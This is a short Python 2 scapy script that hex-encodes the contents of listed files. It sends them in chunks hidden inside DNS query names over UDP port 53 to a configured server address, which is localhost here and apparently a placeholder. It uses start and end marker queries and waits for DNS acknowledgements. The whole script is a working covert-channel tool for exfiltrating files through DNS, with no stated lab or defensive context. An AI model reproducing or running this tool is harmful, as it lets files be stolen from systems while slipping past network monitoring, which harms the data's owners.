#!/usr/bin/python

import time

from scapy.all import *

ip = "127.0.0.1"
pk = IP(src=ip, dst=ip) / UDP(dport=53)  # /DNS()
pck_fin = pk / DNS(rd=1, qd=DNSQR(qname="LAST"))


def dnsAckFilter(pck):
    if pck.haslayer("IP") and pck[IP].dst == ip and \
            pck.haslayer("UDP") and pck.haslayer("DNSQR") and pck[UDP].dport == 53:
        if pck[DNSQR].qname == "OK.":
            return True
    return False


# indication to mark end of file
def sendDoneFileIndication():
    time.sleep(5)
    send(pck_fin, verbose=0)

    print "done indication sent - waiting for ack"
    sniff(count=1, lfilter=dnsAckFilter)
    print "Next file"
    time.sleep(2)


# file receives list of files and sends them to server
def sendFiles(lst, temp):
    print "Start sending each file"
    for f in lst:
        n = 1
        c = 0
        t = str(temp[0]) + "" + str(f)
        print "Reading {} and sending".format(t)
        with open(t, "rb") as b:
            s = str(b.read()).encode("hex")
        res = list(s)
        hexf = ""
        pcks = []
        for i in range(len(res)):
            hexf += res[i]
            n += 1
            if n == 41:
                c += 1
                pcks.append(pk / DNS(rd=1, qd=DNSQR(qname=str(c) + "|" + hexf)))
                n = 1
                hexf = ""
        if n != 1:
            c += 1
            pcks.append(pk / DNS(rd=1, qd=DNSQR(qname=str(c) + "|" + hexf)))
        n = len(pcks)
        print "Sending {} packets by fragmentation".format(n)
        pck_name = pk / DNS(rd=1, qd=DNSQR(qname="FIRST|" + f + "|" + str(n)))
        send(pck_name, verbose=0)
        # send(pck_name)
        print "sent data packet"
        send(pcks, verbose=0)
        # send(pcks)
        time.sleep(1)

        print "File " + t + " was sent....Sending done indication"

        sendDoneFileIndication()
